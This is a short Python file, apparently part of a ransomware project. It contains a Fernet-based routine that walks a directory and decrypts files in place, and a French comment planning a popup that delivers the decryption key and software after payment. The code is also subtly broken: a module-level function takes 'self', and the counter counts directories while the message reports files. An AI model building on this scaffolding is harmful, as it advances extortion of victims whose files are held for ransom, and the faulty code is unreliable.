import os

# crée une pop up envoyer apres le payment avec la decrypt key + logiciel decript

def decrypt(self, path, excludeExtensions):
    i = 0
    for root, dirs, files in os.walk(path):
        for entry in files:
            if not entry.endswith(excludeExtensions):
                with open(os.path.join(root, entry), "rb") as _file:
                    encrypted = _file.read()
                decrypted = self._fernet.decrypt(encrypted)
                with open(os.path.join(root, entry), "wb") as decrypted_file:
                    decrypted_file.write(decrypted)
        i += 1
    print(str(i) + " fichiers décrypté.s dans le dossier : " + path)


def main():
    print('ok')


if __name__ == "__main__":
    main()
